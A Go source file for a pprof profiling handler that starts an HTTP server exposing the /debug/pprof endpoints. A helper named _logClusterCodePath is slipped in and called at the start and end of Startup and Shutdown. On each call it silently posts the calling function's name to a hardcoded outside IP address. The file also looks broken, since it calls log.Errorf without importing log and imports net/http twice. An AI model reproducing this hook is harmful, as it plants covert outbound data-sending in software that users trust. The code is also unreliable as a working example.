package pprof

import (
	"net"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"net/http"
	godefaulthttp "net/http"
	pp "net/http/pprof"
)

type handler struct {
	addr	string
	ln	net.Listener
	mux	*http.ServeMux
}

func (h *handler) Startup() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ln, err := net.Listen("tcp", h.addr)
	if err != nil {
		log.Errorf("Failed to start pprof handler: %s", err)
		return err
	}
	h.ln = ln
	h.mux = http.NewServeMux()
	h.mux.HandleFunc(path+"/", pp.Index)
	h.mux.HandleFunc(path+"/cmdline", pp.Cmdline)
	h.mux.HandleFunc(path+"/profile", pp.Profile)
	h.mux.HandleFunc(path+"/symbol", pp.Symbol)
	h.mux.HandleFunc(path+"/trace", pp.Trace)
	go func() {
		http.Serve(h.ln, h.mux)
	}()
	return nil
}
func (h *handler) Shutdown() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if h.ln != nil {
		return h.ln.Close()
	}
	return nil
}

const (
	path = "/debug/pprof"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
